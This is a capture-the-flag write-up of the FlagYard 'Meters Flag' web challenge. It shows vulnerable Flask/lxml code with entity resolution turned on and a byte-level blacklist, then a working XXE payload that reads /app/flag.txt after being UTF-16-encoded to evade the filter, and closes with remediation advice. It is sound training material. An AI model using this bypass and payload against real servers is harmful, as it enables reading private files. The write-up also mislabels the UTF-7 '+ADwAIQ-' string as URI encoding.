FlagYard | Meters Flag (Web — Easy) — Writeup

**Fares Badaj**

---

## Info

| | |
|---|---|
| Challenge | Meters Flag |
| Difficulty | Easy |
| Category | Web |
| Platform | FlagYard Training Labs (SAFCSP) |
| Description | *Unleash your web hacking skills to unearth the secret flag hidden at `/app/flag.txt`* |
| Flag | `FlagY{d44193750f0091f542ee366087a38fc6}` |

---

## 1. Recon

The instance serves a **BMI Calculator** (Flask + lxml). The interesting
endpoint is the `POST /` handler, which accepts **raw XML**:

```xml
<root>
  <weight>70</weight>
  <height>175</height>
</root>
```

and echoes the values back in an XML response:

```xml
<response>
  <height>175</height>
  <weight>70</weight>
  <result>BMI: 22.86 (Normal weight)</result>
</response>
```

## 2. Reading the source

A copy of the server code lives in the challenge (see `metersflag.py`):

```python
@app.route('/', methods=['POST'])
def calculate_bmi():
    xml_data = request.data

    if b"<!DOCTYPE" in xml_data or b"+ADwAIQ-ENTITY" in xml_data:
        return "I'm watching you *-*"

    parser = etree.XMLParser(resolve_entities=True)
    doc = etree.fromstring(xml_data, parser)
    ...
```

The decisive line is **`resolve_entities=True`** — classic XXE. The goal
(`/app/flag.txt`) is exactly the kind of local file XXE reads.

The only protection is a **byte-level blacklist** applied to the raw request
body:

* `b"<!DOCTYPE"`  — blocks a plain DOCTYPE declaration
* `b"+ADwAIQ-ENTITY"` — blocks the URI-encoded form `<!ENTITY` (a variant of
  the old CodeIgniter `%ADw%AIQ` encoder trick)

Both checks look for literal ASCII byte sequences in `request.data`.

## 3. Blacklist bypass: send the XML in UTF-16

`request.data` is the untouched raw body, so the filter compares raw bytes.
If we encode the whole XML payload as **UTF-16** (with BOM), every ASCII
character is carried as a 2-byte unit with an interspersed NUL byte:

```
'<' '\0' '!' '\0' 'D' '\0' 'O' '\0' ...
```

The literal ASCII substring `<!DOCTYPE` does **not** appear anywhere in the
bytes, so both blacklist checks pass. Meanwhile `lxml` auto-detects the
encoding from the BOM and parses the request normally.

## 4. XXE payload

```xml
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<root>
  <weight>&xxe;</weight>
  <height>100</height>
</root>
```

Posted as `Content-Type: application/xml` with the body `.encode("utf-16")`.
`resolve_entities=True` resolves `&xxe;` → the contents of `/app/flag.txt`,
which lands inside `<weight>` — and the server happily echoes it back:

```xml
<response>
  <height>100</height>
  <weight>FlagY{d44193750f0091f542ee366087a38fc6}</weight>
  ...
</response>
```

The float conversion on the file content fails, but the echo happens *after*
that, so the flag is still reflected in the response.

---

## Root cause

* `resolve_entities=True` enables classic XXE.
* Filtering is done on **raw bytes** instead of the *decoded* XML, so any
  alternate encoding (UTF-16/UTF-32, compression, etc.) that lxml auto-detects
  sidesteps the blacklist completely.

## Remediation

* Use `resolve_entities=False` / `no_network=True` (or `defusedxml`).
* Never parse untrusted XML; reject with a guaranteed-safe parser.
* Filter on the *parsed* document (e.g. reject any `<!DOCTYPE` after decode),
  never on raw request bytes.

## Files

* `solve_meters.py` — automated exploit.
* `flag_from_meters.txt` — `FlagY{d44193750f0091f542ee366087a38fc6}`.